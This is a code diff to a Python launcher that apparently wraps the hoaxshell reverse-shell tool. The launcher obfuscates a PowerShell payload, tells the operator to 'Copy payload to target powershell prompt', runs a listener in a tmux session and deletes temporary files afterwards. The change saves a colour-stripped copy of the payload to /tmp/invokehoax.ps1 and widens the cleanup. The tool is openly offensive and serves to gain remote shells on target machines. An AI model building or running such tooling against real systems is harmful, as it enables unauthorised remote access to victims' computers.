@@ -89,6 +89,7 @@ def Get_ObfuscatedVariable(replacements):
                     line = line.replace(src, target)
                 f1.write(line)
     print("Payload obfuscated")
+    print("Payload saved to /tmp/invokehoax.ps1 \n")
     time.sleep(0.5)
 
 
@@ -101,9 +102,9 @@ def main():
     Get_ObfuscatedVariable(replacements)
 
     #Payload creation
-    print("Payload saved to /tmp/obfuscated.ps1 \nPayload printing below\n\n")
     os.system("cat /tmp/obfuscated.ps1")
     print("\n" + Fore.RED + "Copy payload to target powershell prompt" + Style.RESET_ALL)
+    os.system("cat /tmp/obfuscated.ps1 | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,3})*)?[mGK]//g' > /tmp/invokehoax.ps1")
     input("\nPress enter to continue")
     os.system("sudo tmux send-keys -t hoaxshell ENTER")
 
@@ -113,7 +114,7 @@ def main():
     os.system("sudo tmux a -t hoaxshell")
 
     #Clean up
-    os.system("sudo rm /tmp/payload.ps1 /tmp/obfuscated.ps1")
+    os.system("sudo rm /tmp/payload.ps1 /tmp/obfuscated.ps1 /tmp/invokehoax.ps1 /tmp/obfuscated.txt")
     os.system("sudo tmux kill-session -t hoaxshell")
     input("Press enter to exit")
 
